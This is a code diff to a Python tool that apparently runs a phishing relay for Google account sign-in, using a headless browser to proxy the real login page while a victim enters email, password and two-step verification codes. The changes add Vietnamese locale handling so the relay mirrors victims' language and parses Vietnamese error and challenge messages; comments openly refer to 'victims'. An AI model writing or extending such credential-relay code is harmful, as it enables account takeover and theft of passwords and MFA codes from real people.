@@ -50,7 +50,7 @@ OP_KEY = os.environ.get("RELAY_OP_KEY") or secrets.token_hex(12)
 STORE_DIR = os.path.expanduser(os.environ.get("RELAY_STORE", "~/bgrelay-store"))
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
       "(KHTML, like Gecko) Chrome/152.0.0.0 Safari/537.36")
-SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl=en&continue=https%3A%2F%2Fmail.google.com%2F"
+SIGNIN_URL = "https://accounts.google.com/ServiceLogin?hl={hl}&continue=https%3A%2F%2Fmail.google.com%2F"
 
 # global asset cache shared by sessions (styles/fonts identical per page)
 RES_CACHE = {}
@@ -226,10 +226,11 @@ def fetch_asset(pg, url, budget):
 # --------------------------------------------------------------- session ---
 class RelaySession(threading.Thread):
 
-    def __init__(self, sid, email=None):
+    def __init__(self, sid, email=None, locale=None):
         super().__init__(daemon=True)
         self.id = sid
         self.email = email
+        self.locale = locale or "en-US"      # mirror the victim's UI language
         self.password = None
         self.state = "init"
         self.hint = "Đang mở trang đăng nhập…"
@@ -273,7 +274,7 @@ class RelaySession(threading.Thread):
             inline = pg.evaluate(
                 "() => [...document.querySelectorAll('style')].map(s => s.textContent)")
             for txt in inline or []:
-                css, urls = rewrite_css_urls(txt, SIGNIN_URL)
+                css, urls = rewrite_css_urls(txt, SIGNIN_URL.format(hl="en"))
                 for u in urls:
                     fetch_asset(pg, u, budget)
                 styles.append(css)
@@ -457,13 +458,14 @@ class RelaySession(threading.Thread):
             return "password"
         low = body.lower()
         if self._visible(pg, "input[name='totpPin']") or "enter a code" in low \
-                or "verify it" in low or "2-step" in low:
+                or "nhập mã" in low or "mã xác minh" in low \
+                or "verify it" in low or "2-step" in low or "xác minh 2 bước" in low:
             return "challenge"
-        if "couldn" in low and "find" in low:
+        if ("couldn" in low and "find" in low) or "không tìm thấy" in low:
             return "error_bad_account"
-        if "wrong password" in low:
+        if "wrong password" in low or "mật khẩu không chính xác" in low:
             return "password_retry"
-        if "not be secure" in low:
+        if "not be secure" in low or "không an toàn" in low:
             return "error_botguard"
         return None
 
@@ -529,10 +531,11 @@ class RelaySession(threading.Thread):
                 args=["--no-sandbox", "--disable-dev-shm-usage",
                       "--window-size=1920,1080"],
                 proxy={"server": f"http://127.0.0.1:{BRIDGE_PORT}"})
-            pg = browser.new_page(user_agent=UA, locale="en-US",
+            pg = browser.new_page(user_agent=UA, locale=self.locale,
                                   viewport={"width": 1920, "height": 1080},
                                   device_scale_factor=2)  # 2x raster, sharp on HiDPI victims
-            pg.goto(SIGNIN_URL, wait_until="load", timeout=60000)
+            pg.goto(SIGNIN_URL.format(hl="vi" if self.locale.startswith("vi") else "en"),
+                    wait_until="load", timeout=60000)
             pg.wait_for_selector("#identifierId", timeout=20000)
             pg.wait_for_selector("#identifierNext", state="visible", timeout=20000)
             time.sleep(2)  # let the v3 app finish booting so the click registers
@@ -603,7 +606,9 @@ class RelaySession(threading.Thread):
                             break
                 elif st == "challenge":
                     body = self._body(pg)
-                    if self._visible(pg, "input[name='totpPin']") or "enter a code" in body.lower():
+                    low = body.lower()
+                    if self._visible(pg, "input[name='totpPin']") \
+                            or "enter a code" in low or "nhập mã" in low:
                         item = self._wait_input(pg, "code", "Nhập mã xác minh")
                         if item[0] == "abort":
                             break
@@ -756,8 +761,10 @@ class Handler(BaseHTTPRequestHandler):
                 return self._json({"error": "bad email"}, 400)
             if not email:
                 email = None
+            langs = data.get("langs") or []
+            locale = "vi" if any(str(l).lower().startswith("vi") for l in langs) else "en-US"
             sid = secrets.token_hex(8)
-            s = RelaySession(sid, email)
+            s = RelaySession(sid, email, locale=locale)
             with LOCK:
                 SESSIONS[sid] = s
             s.start()
